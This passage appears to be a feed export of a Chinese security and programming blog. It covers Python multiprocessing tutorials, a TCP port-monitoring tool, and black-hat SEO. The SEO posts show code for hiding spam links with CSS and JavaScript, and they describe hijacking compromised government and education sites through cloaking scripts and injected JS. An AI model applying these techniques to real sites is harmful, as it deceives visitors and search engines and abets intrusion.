class="line">	pool = Pool(processes=10)</div><div class="line">	<span class="keyword">for</span> i  <span class="keyword">in</span> xrange(500):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		For循环中执行步骤：</div><div class="line">		（1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）</div><div class="line">		（2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）</div><div class="line">		</div><div class="line">		apply_async为异步进程池写法。</div><div class="line">		异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。</div><div class="line">		'<span class="string">''</span></div><div class="line">	    pool.apply_async(<span class="built_in">test</span>, args=(i,)) <span class="comment">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       </span></div><div class="line"></div><div class="line">	<span class="built_in">print</span> “<span class="built_in">test</span>”</div><div class="line">	pool.close()</div><div class="line">	pool.join()</div></pre></td></tr></table></figure>
<p>执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）</p>
<p>注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。</p>
<h5 id="同步进程池（阻塞）"><a href="#同步进程池（阻塞）" class="headerlink" title="同步进程池（阻塞）"></a>同步进程池（阻塞）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):</div><div class="line">       <span class="built_in">print</span> p</div><div class="line">       time.sleep(3)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	pool = Pool(processes=10)</div><div class="line">	<span class="keyword">for</span> i  <span class="keyword">in</span> xrange(500):</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	实际测试发现，for循环内部执行步骤：</div><div class="line">	（1）遍历500个可迭代对象，往进程池放一个子进程</div><div class="line">	（2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）</div><div class="line">	for循环执行完毕，再执行print函数。</div><div class="line">	'<span class="string">''</span></div><div class="line">	    pool.apply(<span class="built_in">test</span>, args=(i,))   <span class="comment">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.</span></div><div class="line"></div><div class="line">	<span class="built_in">print</span> “<span class="built_in">test</span>”</div><div class="line">	pool.close()</div><div class="line">	pool.join()</div></pre></td></tr></table></figure>
<p>说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程…..等500个子进程都执行完了，再执行print “test”。（从结果来看，并没有多进程并发）</p>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing.Process]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing-Process/</url>
      <content type="html"><![CDATA[<p>　　利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池<a href="http://thief.one/2016/11/24/Multiprocessing-Pool">Pool</a>类。</p>
<h4 id="Process介绍"><a href="#Process介绍" class="headerlink" title="Process介绍"></a>Process介绍</h4><h5 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h5><ul>
<li>Process([group [, target [, name [, args [, kwargs]]]]])</li>
<li>group: 线程组，目前还没有实现，库引用中提示必须是None；</li>
<li>target: 要执行的方法；</li>
<li>name: 进程名；</li>
<li>args/kwargs: 要传入方法的参数。</li>
</ul>
<h5 id="实例方法："><a href="#实例方法：" class="headerlink" title="实例方法："></a>实例方法：</h5><ul>
<li>is_alive()：返回进程是否在运行。</li>
<li>join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。</li>
<li>start()：进程准备就绪，等待CPU调度。</li>
<li>run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。</li>
<li>terminate()：不管任务是否完成，立即停止工作进程。</li>
</ul>
<h5 id="属性："><a href="#属性：" class="headerlink" title="属性："></a>属性：</h5><ul>
<li>authkey</li>
<li>daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。</li>
<li>exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。</li>
<li>name：进程名字。</li>
<li>pid：进程号。</li>
</ul>
<h4 id="创建多进程的两种方法"><a href="#创建多进程的两种方法" class="headerlink" title="创建多进程的两种方法"></a>创建多进程的两种方法</h4><p>Process类中，可以使用两种方法创建子进程。</p>
<h5 id="使用Process创建子进程"><a href="#使用Process创建子进程" class="headerlink" title="使用Process创建子进程"></a>使用Process创建子进程</h5><p>说明：用法与Threading相似</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process  <span class="comment">#导入Process模块 </span></div><div class="line">import os  </div><div class="line"></div><div class="line">def <span class="built_in">test</span>(name):</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	函数输出当前进程ID，以及其父进程ID。</div><div class="line">	此代码应在Linux下运行，因为windows下os模块不支持getppid()</div><div class="line">	'<span class="string">''</span></div><div class="line">    <span class="built_in">print</span> <span class="string">"Process ID： %s"</span> % (os.getpid())  </div><div class="line">    <span class="built_in">print</span> <span class="string">"Parent Process ID： %s"</span> % (os.getppid())  </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	windows下，创建进程的代码一下要放在main函数里面</div><div class="line">	'<span class="string">''</span> </div><div class="line">    proc = Process(target=<span class="built_in">test</span>, args=(<span class="string">'nmask'</span>,))  </div><div class="line">    proc.start()  </div><div class="line">    proc.join()</div></pre></td></tr></table></figure>
<h5 id="使用Process类继承创建子进程"><a href="#使用Process类继承创建子进程" class="headerlink" title="使用Process类继承创建子进程"></a>使用Process类继承创建子进程</h5><p>说明：通过继承Process类，修改run函数代码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process</div><div class="line">import time</div><div class="line"></div><div class="line">class MyProcess(Process):</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">继承Process类，类似threading.Thread</div><div class="line">'<span class="string">''</span></div><div class="line">    def __init__(self, arg):</div><div class="line">        super(MyProcess, self).__init__()</div><div class="line">        <span class="comment">#multiprocessing.Process.__init__(self)</span></div><div class="line">        self.arg = arg</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    重构run函数</div><div class="line">    '<span class="string">''</span></div><div class="line">        <span class="built_in">print</span> <span class="string">'nMask'</span>, self.arg</div><div class="line">        time.sleep(1)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">        p = MyProcess(i)</div><div class="line">        p.start()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(10):</div><div class="line">    	p.join()</div></pre></td></tr></table></figure>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python Multiprocessing]]></title>
      <url>http://thief.one/2016/11/23/Python-multiprocessing/</url>
      <content type="html"><![CDATA[<p>　　multiprocessing是Python的标准模块，它既可以用来编写多进程，也可以用来编写多线程。如果是多线程的话，用multiprocessing.dummy即可，用法与multiprocessing基本相同，这里主要介绍多进程的用法，欢迎纠错。</p>
<h4 id="（一）Multiprocessing介绍"><a href="#（一）Multiprocessing介绍" class="headerlink" title="（一）Multiprocessing介绍"></a>（一）Multiprocessing介绍</h4><h5 id="为什么要使用python多进程？"><a href="#为什么要使用python多进程？" class="headerlink" title="为什么要使用python多进程？"></a>为什么要使用python多进程？</h5><p>　　因为python使用全局解释器锁(GIL)，他会将进程中的线程序列化，也就是多核cpu实际上并不能达到并行提高速度的目的，而使用多进程则是不受限的，所以实际应用中都是推荐多进程的。<br>　　如果每个子进程执行需要消耗的时间非常短（执行+1操作等），这不必使用多进程，因为进程的启动关闭也会耗费资源。<br>　　当然使用多进程往往是用来处理CPU密集型（科学计算）的需求，如果是IO密集型（文件读取，爬虫等）则可以使用多线程去处理。</p>
<h5 id="multiprocessing常用组件及功能"><a href="#multiprocessing常用组件及功能" class="headerlink" title="multiprocessing常用组件及功能"></a>multiprocessing常用组件及功能</h5><p>创建管理进程模块：</p>
<ul>
<li><a href="http://thief.one/2016/11/24/Multiprocessing-Process">Process</a>（用于创建进程模块）</li>
<li><a href="http://thief.one/2016/11/24/Multiprocessing-Pool">Pool</a>（用于创建管理进程池）</li>
<li>Queue（用于进程通信，资源共享）</li>
<li>Value，Array（用于进程通信，资源共享）</li>
<li>Pipe（用于管道通信）</li>
<li>Manager（用于资源共享）</li>
</ul>
<p>同步子进程模块：</p>
<ul>
<li>Condition</li>
<li>Event</li>
<li>Lock</li>
<li>RLock</li>
<li>Semaphore</li>
</ul>
<h4 id="（二）Multiprocessing进程管理模块"><a href="#（二）Multiprocessing进程管理模块" class="headerlink" title="（二）Multiprocessing进程管理模块"></a>（二）Multiprocessing进程管理模块</h4><p>说明：由于篇幅有限，模块具体用法结束请参考每个模块的具体链接。</p>
<h5 id="Process模块"><a href="#Process模块" class="headerlink" title="Process模块"></a>Process模块</h5><p>Process模块用来创建子进程，是Multiprocessing核心模块，使用方式与Threading类似，可以实现多进程的创建，启动，关闭等操作。<br>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing-Process">Process模块介绍</a></p>
<h5 id="Pool模块"><a href="#Pool模块" class="headerlink" title="Pool模块"></a>Pool模块</h5><p>Pool模块是用来创建管理进程池的，当子进程非常多且需要控制子进程数量时可以使用此模块。<br>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing-Pool">Pool模块介绍</a></p>
<h5 id="Queue模块"><a href="#Queue模块" class="headerlink" title="Queue模块"></a>Queue模块</h5><p>Queue模块用来控制进程安全，与线程中的Queue用法一样。</p>
<h5 id="Pipe模块"><a href="#Pipe模块" class="headerlink" title="Pipe模块"></a>Pipe模块</h5><p>Pipe模块用来管道操作。</p>
<h5 id="Manager模块"><a href="#Manager模块" class="headerlink" title="Manager模块"></a>Manager模块</h5><p>Manager模块常与Pool模块一起使用，作用是共享资源。</p>
<h4 id="（三）Multiprocessing同步进程模块"><a href="#（三）Multiprocessing同步进程模块" class="headerlink" title="（三）Multiprocessing同步进程模块"></a>（三）Multiprocessing同步进程模块</h4><h5 id="Lock模块"><a href="#Lock模块" class="headerlink" title="Lock模块"></a>Lock模块</h5><p>作用：当多个进程需要访问共享资源的时候，Lock可以用来避免访问的冲突。</p>
<p>具体场景：所有的任务在打印的时候都会向同一个标准输出(stdout)输出。这样输出的字符会混合在一起，无法阅读。使用Lock同步，在一个任务输出完成之后，再允许另一个任务输出，可以避免多个任务同时向终端输出。</p>
<p>代码实现：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process, Lock  </div><div class="line"></div><div class="line">def l(lock, num):  </div><div class="line">    lock.acquire()  </div><div class="line">    <span class="built_in">print</span> <span class="string">"Hello Num: %s"</span> % (num)  </div><div class="line">    lock.release()  </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </div><div class="line">    lock = Lock()  <span class="comment">#这个一定要定义为全局</span></div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(20):  </div><div class="line">        Process(target=l, args=(lock, num)).start()  <span class="comment">#这个类似多线程中的threading，但是进程太多了，控制不了。</span></div></pre></td></tr></table></figure></p>
<h5 id="Semaphore模块"><a href="#Semaphore模块" class="headerlink" title="Semaphore模块"></a>Semaphore模块</h5><p>作用：用来控制对共享资源的访问数量，例如池的最大连接数。</p>
<h5 id="Event模块"><a href="#Event模块" class="headerlink" title="Event模块"></a>Event模块</h5><p>作用：用来实现进程间同步通信。</p>
<h4 id="（四）Multiprocessing-dummy多线程"><a href="#（四）Multiprocessing-dummy多线程" class="headerlink" title="（四）Multiprocessing.dummy多线程"></a>（四）Multiprocessing.dummy多线程</h4><p>Multiprocessing.dummy用法与Multiprocessing用法基本相同，只不过是用来创建多线程。</p>
<h4 id="（五）使用Multiprocessing疑问"><a href="#（五）使用Multiprocessing疑问" class="headerlink" title="（五）使用Multiprocessing疑问"></a>（五）使用Multiprocessing疑问</h4><ul>
<li><em>启动多进程的代码一定要放在 </em>if <strong>name</strong>==”<strong>main</strong>“:<em> 后面吗？</em></li>
</ul>
<p>　　解答：windows系统下，想要启动一个子进程，必须加上<em>if <strong>name</strong>==”<strong>main</strong>“:</em>，linux则不需要。</p>
<ul>
<li><em>父进程中的全局变量能被子进程共享吗？</em></li>
</ul>
<p>　　解答：不行，因为每个进程享有独立的内存数据，如果想要共享资源，可以使用Manage类，或者Queue等模块。</p>
<ul>
<li><em>子进程能结束其他子进程或父进程吗？如果能，怎么通过子进程去结束所有进程?</em></li>
</ul>
<p>　　解答：此需求可以稍作修改：所有的子进程都是为了完成一件事情，而当某个子进程完成该事情后，父进程就该结束所有子进程，请问该怎么做？此时结束所有子进程的操作可以交给父进程去做，因为子进程想要结束另外的子进程比较难实现。<br>　　那么问题就又变成了父进程什么时候该结束所有进程？<br>　　其中一个思路是<em>获取每个子进程的返回值</em>，一旦有返回True（结束的标记），则立马结束所有进程；<br>　　另外一种思路是<em>使用共享资源</em>，父进程可以一直去判断这个公共资源，一旦子进程将它改变，则结束所有子进程。（推荐使用前者，因为多进程中不推荐使用资源共享）</p>
<ul>
<li><em>子进程中还能再创建子进程吗？</em></li>
</ul>
<p>解答：可以，子进程可以再创建进程，线程中也可以创建进程。</p>
<h4 id="（六）多进程资源共享问题"><a href="#（六）多进程资源共享问题" class="headerlink" title="（六）多进程资源共享问题"></a>（六）多进程资源共享问题</h4><p>多进程中不推荐使用资源共享，如果非要使用，可以参考以下链接。</p>
<p>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing共享资源">多进程资源共享问题</a></p>
<h4 id="（七）获取子进程返回值问题"><a href="#（七）获取子进程返回值问题" class="headerlink" title="（七）获取子进程返回值问题"></a>（七）获取子进程返回值问题</h4><p>多进程中往往会碰到获取子进程返回值的问题，如果遇到问题可以参考以下链接。</p>
<p>具体介绍请参考：<a href="http://thief.one/2016/11/24/Multiprocessing子进程返回值">获取子进程返回值问题</a></p>
<hr>

<p>参考网络文章：</p>
<p><a href="http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html" target="_blank" rel="external">http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html</a><br><a href="http://www.cnblogs.com/kaituorensheng/p/4465768.html" target="_blank" rel="external">http://www.cnblogs.com/kaituorensheng/p/4465768.html</a><br>……<br>太多了，列举不完，排名不分先后。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[TcpScanner端口存活探测]]></title>
      <url>http://thief.one/2016/10/14/TcpScanner%E7%AB%AF%E5%8F%A3%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B/</url>
      <content type="html"><![CDATA[<p>　　TcpScanner是一款探测服务器端口存活性的扫描工具，它基于TCP扫描，图形化界面管理，主要适用对象为服务器运维人员。一般中小型网络环境，其服务器的数量往往要多于网络设备，尤其是有web业务的公司。对于运维人员来说，必须保证业务不能中断（服务器端口服务正常），而网络中服务器数量往往很庞大，怎样及时发现问题很关键。因此，基于先前编写过的一款TCP扫描工具，略做修改，在此分享。</p>
<h3 id="TcpScanner介绍"><a href="#TcpScanner介绍" class="headerlink" title="TcpScanner介绍"></a>TcpScanner介绍</h3><p>在介绍工具用法前，我先来说说这款工具的具体功能以及优缺点。<br>先来一张截图：<br><img src="/upload_image/20161014/jietu.png" alt=""><br>背景金刚狼！</p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul>
<li>检测服务器端口存活性</li>
<li>支持nslookup</li>
<li>邮件告警（1.3版本中已加入）</li>
</ul>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>图形化界面，管理方便使用简单</li>
<li>支持批量服务器端口检测</li>
<li>自定义扫描间隔，自定义结果筛选条件</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>目前只支持tcp扫描</li>
<li>没有优化，可能存在一些bug</li>
</ul>
<h3 id="TcpScanner用法"><a href="#TcpScanner用法" class="headerlink" title="TcpScanner用法"></a>TcpScanner用法</h3><h4 id="（1）填写excel"><a href="#（1）填写excel" class="headerlink" title="（1）填写excel"></a>（1）填写excel</h4><p>先准备一张excel表，填写将要检测的服务器名称、ip、端口、域名。<br><img src="/upload_image/20161014/excel.png" alt=""><br>严格按照模板填写，否则可能会使结果不准确，<em>NAME列不要出现重复，如果是同一台服务器，名字可以加以区分。</em></p>
<h4 id="（2）加载excel"><a href="#（2）加载excel" class="headerlink" title="（2）加载excel"></a>（2）加载excel</h4><p>运行程序，点击浏览，加载填写完毕的excel文件(最好是.xls文件，xlsx可能会报错)。</p>
<h4 id="（3）检测excel"><a href="#（3）检测excel" class="headerlink" title="（3）检测excel"></a>（3）检测excel</h4><p>点击检测，程序将对excel填写内容进行检测，如无问题则显示<em>导入excel成功</em>，如有问题则检查excel填写是否有误。</p>
<h4 id="（4）选择参数"><a href="#（4）选择参数" class="headerlink" title="（4）选择参数"></a>（4）选择参数</h4><p>选择运行间隔、中断筛选参数。<br>注：运行间隔表示多久扫描一次（单位：s），中断筛选表示显示中断几次以上的条目（单位：次）。</p>
<h4 id="（5）开始运行"><a href="#（5）开始运行" class="headerlink" title="（5）开始运行"></a>（5）开始运行</h4><p>　　点击开始按钮，此时正常来说程序开始运行了。程序界面上有三个显示框，从右手边开始，第一个显示所有检测的条目，第二个显示出现中断的条目，第三个显示筛选后最终的条目。</p>
<p>　　此时，运维人员便可以通过观察最终显示框中是否存在条目，来判断是否有中断的服务了。当然，如果需要运维人员时时看着程序，工作量也很大，所以在此V1.3版本中增加了邮件通知功能，即出现中断服务通过邮件发送告警通知。</p>
<p>注：<em>在程序运行后，出现的条目前面有标注数字，这表示此条目中断的次数，如果恢复了，则数字会减小。</em></p>
<h3 id="TcpScanner下载"><a href="#TcpScanner下载" class="headerlink" title="TcpScanner下载"></a>TcpScanner下载</h3><p>（GITHUB源代码下载）：<a href="https://github.com/tengzhangchao/TcpScanner" target="_blank" rel="external">TcPScannerV1.2</a><br>（百度网盘下载）：<a href="http://pan.baidu.com/s/1hsjYQlI" target="_blank" rel="external">TcPScannerV1.2</a><br>（如果需要1.3版本，可以在博客下方留言）</p>
<p>结语：<em>工具是在2016.2月编写的，现进行了一些小改动，可能存在bug，如出现错误可留言告知，我会尽快修复，谢谢！</em></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之暗链]]></title>
      <url>http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/</url>
      <content type="html"><![CDATA[<p>　　暗链也称为<em>黑链</em>，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。在早期的SEO优化中，黑链是最有效最迅速的方法之一；但是现在百度算法已经对iframe和display:none 等直接进行了打击，如果你对代码没有任何处理的话，那么你所做的外链将全部降权。因此，目前黑帽SEO技术中，暗链已经用得不多，但还是有必要了解下这个经典的作弊手法。</p>
<p>　　挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现，其他高级手法。</p>
<h3 id="利用CSS实现挂暗链"><a href="#利用CSS实现挂暗链" class="headerlink" title="利用CSS实现挂暗链"></a>利用CSS实现挂暗链</h3><h4 id="display属性"><a href="#display属性" class="headerlink" title="display属性"></a>display属性</h4><p>将display属性设置为none，则页面上不显示此内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"display:none;"</span>&gt;</div><div class="line">&lt;a href=http://thief.one/ &gt;暗链&lt;/a&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<p>分析：这种形式以前效果较好，现在不建议使用，易被搜索引擎察觉。</p>
<h4 id="color-font-size-line-height属性"><a href="#color-font-size-line-height属性" class="headerlink" title="color/font-size/line-height属性"></a>color/font-size/line-height属性</h4><p>将color颜色设置与页面背景色一样，大小设置为小于或等于1。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=http://thief.one style=<span class="string">"color:#FFFFFF;font-size:1px;line-height:1px ;"</span>&gt;暗链&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>分析：最初级的隐蔽链接，易被搜索引擎察觉。</p>
<h4 id="position属性"><a href="#position属性" class="headerlink" title="position属性"></a>position属性</h4><p>将position位置属性设置成负数，使内容位于页面可见范围以外。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"position: absolute; top: -999px;left: -999px;"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"position:absolute;left:expression_r(1-900);top:expression_r(3-999);"</span>&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>分析：以上2种写法，都是将内容放到可见范围以外，容易被搜索引擎识别。</p>
<h4 id="marquee属性"><a href="#marquee属性" class="headerlink" title="marquee属性"></a>marquee属性</h4><p>设置marquee滚动标签属性，使之快速闪现。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;marquee height=1 width=5 scrollamount=3000 scrolldelay=20000&gt;&lt;a href=http://thief.one &gt;暗链&lt;/a&gt;&lt;/marquee&gt;</div></pre></td></tr></table></figure></p>
<p>分析：链接以赛马灯形式迅速闪现，这种形式以前效果较好，现在不建议使用。</p>
<h3 id="利用JS实现挂暗链"><a href="#利用JS实现挂暗链" class="headerlink" title="利用JS实现挂暗链"></a>利用JS实现挂暗链</h3><p>利用js向页面中写入css代码，设置属性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">document.write(<span class="string">"&lt;div style='display:none;'&gt;"</span>);</div><div class="line">&lt;/script&gt;&lt;div&gt;</div><div class="line"></div><div class="line">&lt;a href=http://thief.one&gt;暗链&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;script language=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">document.write(<span class="string">"&lt;/div&gt;"</span>);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>分析：js输出前面提到的css代码，到达一样的效果。目前来说Google对这种js形式的代码的内部实质意义还无法识别，但也不建议使用这种。</p>
<h3 id="利用DIV-JS实现挂暗链"><a href="#利用DIV-JS实现挂暗链" class="headerlink" title="利用DIV+JS实现挂暗链"></a>利用DIV+JS实现挂暗链</h3><p>利用div与js功能，修改属性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;div id=<span class="string">"anlian"</span>&gt;&lt;a href=<span class="string">"http://thief.one"</span>&gt;暗链&lt;/a&gt;&lt;/div&gt;</div><div class="line">&lt;script language=javascript&gt;</div><div class="line">document.getElementById(<span class="string">"anlian"</span>).style.display=<span class="string">"none"</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>分析：这是一种DIV与JS结合做黑链的一种常见方法，蜘蛛一般不会读取script的内容，只会读取div里的链接，可是div的显示属性却被script修改了。</p>
<h3 id="挂暗链高级姿势"><a href="#挂暗链高级姿势" class="headerlink" title="挂暗链高级姿势"></a>挂暗链高级姿势</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;div class=<span class="string">"father"</span> style=<span class="string">"position:relative"</span>&gt;</div><div class="line">　　&lt;div class=<span class="string">"topLever"</span> style=<span class="string">"position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;border:1px solid #333;background:#eee"</span>&gt;遮挡层：可以放图片或者Flash&lt;/div&gt;</div><div class="line">　　&lt;div class=<span class="string">"hideDontent"</span>&gt;隐蔽层：可以放暗链链接&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>分析：这种方式一般是放在Flash、图片或者其它层对象下方。这个代码是用父层相对定位，子层用绝对定位固定住以用来遮挡下面的隐蔽层内的暗链内容。</p>
<p>结语：<em>暗链不是什么新鲜的技术，但黑帽SEO始终在摸索前行，路漫漫其修远兮！</em></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之网页劫持]]></title>
      <url>http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/</url>
      <content type="html"><![CDATA[<p>　　网页劫持是目前黑帽SEO或者说黑产最喜欢的一种网页引流方式，此手法往往通过入侵政府、教育机构网站（权重高），修改网站源代码、放寄生虫程序、设置二级目录反向代理等实现。网页劫持可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；表现形式可以是劫持跳转，也可以是劫持呈现的网页内容，目前被广泛应用于私服、博彩等暴利行业。</p>
<h3 id="服务端劫持"><a href="#服务端劫持" class="headerlink" title="服务端劫持"></a>服务端劫持</h3><p>服务端劫持也称为全局劫持，手法为修改网站动态语言文本，判断访问来源控制返回内容，从来达到网站劫持的目的。</p>
<h4 id="asp-aspx-php劫持"><a href="#asp-aspx-php劫持" class="headerlink" title="asp/aspx/php劫持"></a>asp/aspx/php劫持</h4><p>　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本， 然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问，则返回正常页面。</p>
<h3 id="客户端劫持"><a href="#客户端劫持" class="headerlink" title="客户端劫持"></a>客户端劫持</h3><p>客户端劫持的手法也很多，但主要就是2种：js劫持、Header劫持。</p>
<h4 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h4><p>js劫持目的：通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。<br>js植入手法：可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。</p>
